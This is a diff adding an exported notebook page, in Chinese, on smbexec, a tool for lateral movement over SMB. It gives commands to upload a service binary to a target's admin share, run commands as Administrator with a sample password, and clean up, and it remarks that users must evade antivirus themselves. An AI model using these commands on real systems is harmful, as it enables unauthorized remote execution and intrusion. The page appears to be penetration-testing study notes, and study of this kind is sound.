@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>smbexec</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>smbexec</h1><br/>smbexec<br />smbexec 是基于 psexec 修改的程序，加入了参数来指定默认共享，可以在目标为开启 admin$ 共享但开了其它共享时使用。<br /><br />常用命令<br />建立 ipc 连接(参见net use + at)后，上传 execserver.exe 到远程系统上<br />copy execserver.exe \\192.168.17.138\c$\windows<br /><br />在远程系统上执行单条命令(以管理员权限执行命令)<br />test.exe 192.168.17.138 Administrator !@#123QWE &quot;whoami /all&quot; c$<br /><br />在远程系统上执行单条命令(以删除了管理员权限的普通用户权限执行命令，原因参见LocalAccountTokenFilterPolicy)<br />test.exe 192.168.17.138 test !@#123QWE &quot;whoami /all&quot; c$<br /><br />在远程系统上执行 bat 脚本(以管理员权限执行命令)<br />test.exe 192.168.17.138 Administrator !@#123QWE c:\programdata\test.bat ipc$<br /><br />删除远程系统上的 execserver.exe<br />del \\192.168.17.138\c$\windows\execserver.exe<br />工具说明<br />• smbexec会被很多杀软查杀，需自行免杀。<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
